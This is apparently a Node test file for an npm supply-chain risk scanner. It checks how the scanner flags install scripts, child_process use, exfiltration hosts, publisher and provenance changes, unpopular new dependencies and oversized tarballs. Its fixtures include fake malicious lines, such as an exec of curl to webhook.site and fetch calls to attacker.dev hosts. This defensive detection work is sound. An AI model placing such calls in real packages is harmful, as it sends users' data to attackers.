import assert from 'node:assert/strict'
import { Buffer } from 'node:buffer'
import { createHash } from 'node:crypto'
import { test } from 'node:test'
import { gzipSync } from 'node:zlib'
import publishers from '@preventive/publishers/npm.js'
import { DEFAULT_MINIMUM_RELEASE_AGE, NpmRiskError, assessNpm, npmFileRisk } from '../risk/index.js'
import { linesNote } from '../ui/view/file-runs-code.js'
import { npmVersionManifest } from '../risk/npm/manifest.js'
import { MAX_TAR_BYTES, npmTarballVersion } from '../risk/npm/tarball.js'
import { npmFilesDiff } from '../risk/npm/diff.js'
import { npmAddedDependency } from '../risk/npm/new-dependency.js'
import { npmSettledDownloads } from '../risk/npm/downloads.js'
import { REGISTRY, packageOf } from './_managed-npm.js'

const DAY = 24 * 60 * 60_000
const NOW = Date.parse('2026-10-12T12:00:00Z')
const ago = days => new Date(NOW - days * DAY).toISOString()

// A package's whole document, as npm's registry has it, of `{ name, versions:
// [{ doc, published }], created? }`.
const documentOf = ({ name, versions, created }) => ({ name, versions: Object.fromEntries(versions.map(({ doc }) => [doc.version, doc])),
  time: { created: created ?? versions[0].published, modified: versions.at(-1).published, ...Object.fromEntries(versions.map(({ doc, published }) => [doc.version, published])) } })

// npm's registry and downloads API for `packages`, each `{ name, versions:
// [{ doc, tgz, published }], created? }`, and `downloads` by name; each URL
// asked, in order.
function npm(t, packages, downloads = {}) {
  const asked = []
  t.mock.method(globalThis, 'fetch', input => Promise.resolve(answer(String(input))))
  const answer = url => {
    asked.push(url)
    if (url.startsWith('https://api.npmjs.org/downloads/range/')) {
      const name = decodeURIComponent(url.split('/').at(-1))
      return downloads[name] ? Response.json(downloads[name]) : Response.json({ error: `package ${name} not found` }, { status: 404 })
    }
    for (const pkg of packages) {
      if (url === `${REGISTRY}/${pkg.name}`) return Response.json(documentOf(pkg))
      for (const { doc, tgz } of pkg.versions) if (url === doc.dist.tarball) return new Response(tgz)
    }
    return Response.json({ error: 'Not found' }, { status: 404 })
  }
  return asked
}

// A cache kept in a Map, noting each type written.
function store() {
  const kept = new Map(), written = new Set()
  return { kept, written, read: (type, key) => Promise.resolve(kept.get(`${type} ${key}`) ?? null), write: (type, key, value) => { written.add(type); kept.set(`${type} ${key}`, value); return Promise.resolve() } }
}

const version = (name, number, files, extra, published) => ({ ...packageOf(name, number, files, extra), published })
const ids = assessment => assessment.findings.map(({ id }) => id)

test('a version alone: what it holds, its files stamped, too new under the minimum release age', async t => {
  const files = { 'package.json': '{"name":"lone"}', 'index.js': 'require("child_process").exec("curl https://webhook.site/x")\n', 'README.md': '# lone' }
  npm(t, [{ name: 'lone', versions: [version('lone', '1.0.0', files, { dependencies: {}, scripts: { postinstall: 'node setup.js' } }, ago(1))] }])
  const assessment = await assessNpm('lone', '1.0.0', { now: NOW, downloads: false })
  assert.equal(assessment.published, ago(1))
  assert.deepEqual(ids(assessment), ['held-install-scripts', 'held-runs-code', 'held-exfiltration', 'too-new'], 'as the Overview flags a version on its own')
  assert.deepEqual(assessment.findings.find(({ id }) => id === 'held-runs-code'), { id: 'held-runs-code', severity: 'high', files: [{ path: 'index.js', found: { 'child-process': [1] } }] })
  assert.deepEqual(assessment.findings[0], { id: 'held-install-scripts', severity: 'high', scripts: [['postinstall', 'node setup.js']] })
  assert.deepEqual(assessment.files['index.js'].stamps, [{ name: 'child_process', severity: 'high' }, { name: 'Exfiltration', severity: 'high' }])
  assert.deepEqual(assessment.files['index.js'].exfiltration, { 'webhook-site': [1] })
  assert.deepEqual(assessment.files['README.md'].stamps, [])
  assert.equal(DEFAULT_MINIMUM_RELEASE_AGE, 14 * DAY)
  assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW, downloads: false, minimumReleaseAge: 0 })).includes('too-new'), 'none under a minimum of 0, as own scopes take')
  assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW + 14 * DAY, downloads: false })).includes('too-new'), 'none once old enough')
})

test('against the version before: what it adds and changes, its publisher and provenance, and a new dependency\'s package', async t => {
  const known = publishers[0]
  const before = version('axios-like', '1.0.0', { 'package.json': '{}', 'lib/axios.js': 'require("follow-redirects")\n' },
    { dependencies: { 'follow-redirects': '^1.15.6' }, scripts: {}, _npmUser: { name: known } }, ago(30))
  before.doc.dist.attestations = { provenance: { predicateType: 'https://slsa.dev/provenance/v1' } }
  const after = version('axios-like', '1.0.1', { 'package.json': '{}', 'lib/axios.js': 'require("follow-redirects")\n' },
    { dependencies: { 'follow-redirects': '^1.15.6', 'crypto-like': '^4.2.1' }, scripts: {}, _npmUser: { name: 'someone-new' } }, ago(20))
  const dependency = version('crypto-like', '4.2.1', { 'package.json': '{}', 'setup.js': '' }, { scripts: { postinstall: 'node setup.js' } }, ago(20.5))
  npm(t, [{ name: 'axios-like', versions: [before, after] }, { name: 'crypto-like', versions: [dependency] }])
  const assessment = await assessNpm('axios-like', '1.0.1', { oldVersion: '1.0.0', now: NOW })
  assert.deepEqual(ids(assessment), ['publisher', 'provenance-lost', 'unused-deps'])
  assert.deepEqual(assessment.findings[0], { id: 'publisher', was: known, now: 'someone-new', wasKnown: true, nowKnown: false, severity: 'critical' })
  assert.deepEqual(assessment.findings[2].dependencies, [{ name: 'crypto-like', kind: null, range: '^4.2.1' }])
  const [added] = assessment.dependencies.added
  assert.equal(added.name, 'crypto-like')
  assert.deepEqual(added.flags.map(({ check }) => check), ['unimported'])
  assert.deepEqual([added.tier, added.level, added.uncounted, added.month, added.created, added.gap], [null, 'is-unpopular', true, undefined, ago(20.5), 0.5 * DAY],
    'npm counts none of its downloads: unpopular, saying so, first published half a day before the open version')
})

test('what is read is kept by type, and an assessment kept needs no tarball', async t => {
  const files = { 'package.json': '{}', 'index.js': 'eval(x)\n' }
  const asked = npm(t, [{ name: 'kept', versions: [version('kept', '1.0.0', files, { dependencies: {} }, ago(400)), version('kept', '1.1.0', { ...files, 'more.js': 'fetch("https://collector.attacker.dev/x")' }, { dependencies: {} }, ago(300))] }],
    { kept: { start: '2026-08-01', end: '2026-10-11', days: Array.from({ length: 72 }, () => 10) } })
  const cache = store()
  const first = await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW, cache })
  assert.deepEqual(ids(first), ['kept-runs-code', 'new-hosts', 'popularity'], 'eval kept from 1.0.0; a host named anew; few downloads')
  assert.deepEqual(first.findings.at(-1), { id: 'popularity', severity: 'critical', tier: null, level: 'is-unpopular' })
  assert.deepEqual([...cache.written].toSorted(), ['npm/tarballs', 'risk/npm/assessments', 'risk/npm/downloads', 'risk/npm/packages', 'risk/npm/versions'])
  asked.length = 0
  assert.deepEqual(await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW, cache }), first)
  assert.deepEqual(asked, [], 'everything kept: npm isn\'t asked')
  asked.length = 0
  await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW + DAY, cache })
  assert.deepEqual(asked.map(url => url.replace(/range\/[^/]+/u, 'range/…')), [`${REGISTRY}/kept`, 'https://api.npmjs.org/downloads/range/…/kept'],
    'a day on, its deprecations asked again, as they are after an hour, and its downloads, another day\'s; no tarball')
})

test('npm having no such package or version is said so', async t => {
  npm(t, [{ name: 'there', versions: [version('there', '1.0.0', { 'package.json': '{}' }, {}, ago(30))] }])
  await assert.rejects(assessNpm('there', '9.9.9', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'version-not-found')
  await assert.rejects(assessNpm('missing', '1.0.0', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'package-not-found')
})

test('a tarball unpacking past risk\'s bounds is given up on as it unpacks', async t => {
  const bomb = version('bomb', '1.0.0', { 'package.json': '{}' }, {}, ago(30))
  bomb.tgz = gzipSync(Buffer.alloc(MAX_TAR_BYTES + 1))
  bomb.doc.dist.integrity = `sha512-${createHash('sha512').update(bomb.tgz).digest('base64')}`
  await assert.rejects(npmTarballVersion(bomb.tgz), /package-too-large/u)
  npm(t, [{ name: 'bomb', versions: [bomb] }])
  await assert.rejects(assessNpm('bomb', '1.0.0', { now: NOW, downloads: false }), error => error instanceof NpmRiskError && error.code === 'package-too-large')
})

test('npm\'s documents read within bounds: risk\'s own, or the caller\'s in its stead', async t => {
  const MiB = new Uint8Array(1024 * 1024)
  const endless = () => { let sent = 0; return new ReadableStream({ pull: controller => { if (sent++ > 64) controller.close(); else controller.enqueue(MiB) } }) }
  t.mock.method(globalThis, 'fetch', () => Promise.resolve(new Response(endless())))
  await assert.rejects(assessNpm('huge', '1.0.0', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'upstream-too-large', 'past 64 MiB, no length said')
  t.mock.restoreAll()
  const own = { name: 'hooked', versions: [version('hooked', '1.0.0', { 'package.json': '{}' }, { dependencies: { 'dep-like': '^1.0.0' } }, ago(30))] }
  const dependency = { name: 'dep-like', versions: [version('dep-like', '1.0.0', { 'package.json': '{}' }, {}, ago(31))] }
  const asked = npm(t, [own, dependency]), read = []
  const packument = (name, { authorized }) => { read.push([name, authorized]); return Promise.resolve(documentOf(name === 'hooked' ? own : dependency)) }
  const tarball = (name, number) => { read.push([`${name}@${number}`]); return Promise.resolve(own.versions[0].tgz) }
  const assessment = await assessNpm('hooked', '1.0.0', { now: NOW, packument, tarball })
  assert.deepEqual(read, [['hooked', true], ['hooked@1.0.0'], ['dep-like', false]], 'the package assessed with the caller\'s token, its dependency without; its tarball the caller\'s')
  assert.ok(!asked.some(url => url.startsWith(REGISTRY)), 'npm\'s registry asked nothing')
  const busy = new Error('npm-busy')
  await assert.rejects(assessNpm('hooked', '1.0.0', { now: NOW, packument, tarball: () => Promise.reject(busy) }), error => error === busy, 'a caller\'s failure thrown as it is')
  assert.equal(assessment.dependencies.added[0].level, 'is-unpopular', 'its document read: public, none of its downloads counted')
})

test('npm asked of at most 100 dependencies added, the rest left unknown; npm unreachable said so', async t => {
  const dependencies = Object.fromEntries(Array.from({ length: 120 }, (_, i) => [`dep-${String(i).padStart(3, '0')}`, '^1.0.0']))
  const asked = npm(t, [{ name: 'many', versions: [version('many', '1.0.0', { 'package.json': '{}' }, { dependencies }, ago(30))] }])
  const { added } = (await assessNpm('many', '1.0.0', { now: NOW })).dependencies
  assert.equal(added.length, 120)
  const downloads = asked.filter(url => url.startsWith('https://api.npmjs.org/downloads/range/')).map(url => url.split('/').at(-1)).filter(name => name !== 'many')
  assert.deepEqual(downloads.toSorted(), Object.keys(dependencies).slice(0, 100))
  t.mock.method(globalThis, 'fetch', () => Promise.reject(new TypeError('fetch failed')))
  await assert.rejects(assessNpm('many', '1.0.0', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'upstream-unavailable')
})

test('a tarball read as npm installs it, and two versions\' files paired as Compare pairs them', async () => {
  const { tgz } = packageOf('read', '1.0.0', { 'package.json': '{}', 'b.js': 'b', 'a/c.js': 'c', 'bin/tool': '\0\u0001' })
  const read = await npmTarballVersion(tgz)
  assert.deepEqual(read.json, { version: 3, sources: ['a/c.js', 'b.js', 'bin/tool', 'package.json'], sourcesContent: ['c', 'b', null, '{}'] }, 'sorted; one with a NUL no text')
  assert.equal(read.fileSizes.get('bin/tool'), 2)
  assert.deepEqual(read.npmBinaries, new Map([['bin/tool', { size: 2, digest: `sha256-${createHash('sha256').update('\0\u0001').digest('base64')}` }]]), 'one not text told by its digest, as the server gives it')
  const side = files => ({ kind: 'sourcemap', json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
  const text = 'module.exports = function long() { return 42 }\n'.repeat(20)
  assert.deepEqual(npmFilesDiff(side({ 'old.js': text, 'same.js': 'x', 'edit.js': '1' }), side({ 'new.js': text, 'same.js': 'x', 'edit.js': '2', 'add.js': 'y' })),
    { onlyOther: [{ path: 'add.js' }], changed: [{ path: 'edit.js', modified: true }, { path: 'new.js', basePath: 'old.js', renamedFrom: 'old.js', modified: false }] })
})

test('a file that isn\'t text compared by its digest: one added large is large code, one kept unchanged', async t => {
  const packed = Buffer.alloc(256 * 1024, 0xff), tool = Buffer.from([0, 1, 2])
  const before = version('bin-like', '1.0.0', { 'package.json': '{}', 'bin/tool': tool }, { dependencies: {} }, ago(30))
  const after = version('bin-like', '1.0.1', { 'package.json': '{}', 'bin/tool': tool, 'dist/packed.js': packed }, { dependencies: {} }, ago(20))
  npm(t, [{ name: 'bin-like', versions: [before, after] }])
  const assessment = await assessNpm('bin-like', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
  assert.deepEqual(assessment.findings, [{ id: 'large-code', severity: 'critical', files: [{ path: 'dist/packed.js', bytes: 256 * 1024 }] }], 'not UTF-8, yet added; bin/tool unchanged')
})

test('what a file holds read to a bound: the first 100 places of each kind, 1,000 hosts', () => {
  const lines = (count, line) => Array.from({ length: count }, (_, i) => line(i)).join('\n')
  const first = count => Array.from({ length: count }, (_, i) => i + 1)
  const evals = lines(150, () => 'eval(x)')
  assert.deepEqual(npmFileRisk('lib/a.js', evals, evals.length).runsCode, new Map([['eval', first(100)]]))
  const said = lines(150, () => '// see https://webhook.site/x')
  assert.deepEqual(npmFileRisk('lib/b.js', said, said.length).exfiltration, new Map([['webhook-site', first(100)]]))
  const named = lines(1200, i => `fetch("https://h${i}.attacker.dev/")`)
  const { hosts } = npmFileRisk('lib/c.js', named, named.length)
  assert.deepEqual([hosts.size, hosts.get('h999.attacker.dev'), hosts.has('h1000.attacker.dev')], [1000, 1000, false])
  assert.equal(linesNote(first(100)), 'lines 1, 2, 3, 4, 5 and 95+ more', 'as many as risk keeps: some more yet')
  assert.equal(linesNote(first(99)), 'lines 1, 2, 3, 4, 5 and 94 more')
})

test('an assessment given up on as its signal aborts, upstream\'s download still on its way', async t => {
  const slow = version('slow', '1.0.0', { 'package.json': '{}' }, {}, ago(30))
  let arrive = () => {}
  const fetching = new Promise(resolve => {
    t.mock.method(globalThis, 'fetch', input => {
      if (String(input) !== slow.doc.dist.tarball) return Promise.resolve(Response.json(documentOf({ name: 'slow', versions: [slow] })))
      resolve()
      return new Promise(answer => { arrive = () => answer(new Response(slow.tgz)) })
    })
  })
  const controller = new AbortController()
  const assessed = assessNpm('slow', '1.0.0', { now: NOW, downloads: false, signal: controller.signal })
  await fetching
  controller.abort(new Error('caller gone'))
  await assert.rejects(assessed, /caller gone/u)
  arrive()
})

test('a new dependency\'s package told by its downloads but its latest two weeks\', and its age where it is new since the version compared with', () => {
  const now = Date.parse('2026-10-12T12:00:00Z')
  const days = (perDay, latest = perDay) => ({ start: '2026-08-01', end: '2026-10-11', days: Array.from({ length: 72 }, (_, i) => i < 58 ? perDay : latest) })
  assert.deepEqual(npmSettledDownloads(days(100, 1e6), now), { start: '2026-08-01', end: '2026-09-27', days: Array.from({ length: 58 }, () => 100) }, 'to the day before its latest two weeks')
  assert.equal(npmAddedDependency({ downloads: days(100, 1e6) }, now).tier, Infinity, 'just pulled in, 1M a day of late: unpopular as it was')
  assert.deepEqual([npmAddedDependency({ downloads: days(4e6) }, now)].map(({ tier, wanted }) => [tier, wanted]), [[2000, false]], 'in the top 20,000: its age not asked')
  const axios = ['2026-03-27T19:01:40.000Z', '2026-03-31T00:21:58.000Z']
  assert.deepEqual(npmAddedDependency({ downloads: null, listed: { created: '2026-03-30T05:57:32.867Z', private: false }, published: axios }, now),
    { tier: Infinity, wanted: true, created: '2026-03-30T05:57:32.867Z', gap: 66_265_133 }, 'none counted: unpopular, and new since the version compared with')
  assert.equal(npmAddedDependency({ downloads: null, listed: { created: '2026-03-30T05:57:32.867Z', private: true }, published: axios }, now).tier, null, 'a private one: not told')
  assert.equal(npmAddedDependency({ downloads: days(0), listed: { created: '2020-01-01T00:00:00.000Z', private: false }, published: axios }, now).created, null, 'not one that existed before')
})

test('a version document read for what risk reads of it', () => {
  const [known] = publishers
  assert.deepEqual(npmVersionManifest({ _npmUser: { name: known, email: 'x@example.com' }, deprecated: 'use another', scripts: { prepare: 'tsc', postinstall: 'node x.js' },
    dependencies: { a: '1' }, devDependencies: { b: '1' }, dist: { attestations: { provenance: {} } } }),
  { deprecated: 'use another', publisher: known, knownAccounts: [known], dependencies: { a: '1' }, provenance: true, installScripts: { postinstall: 'node x.js' } })
  assert.deepEqual(npmVersionManifest({ _npmUser: { name: 'GitHub Actions', trustedPublisher: { id: 'github' } } }), { trustedPublisher: 'GitHub Actions' })
})
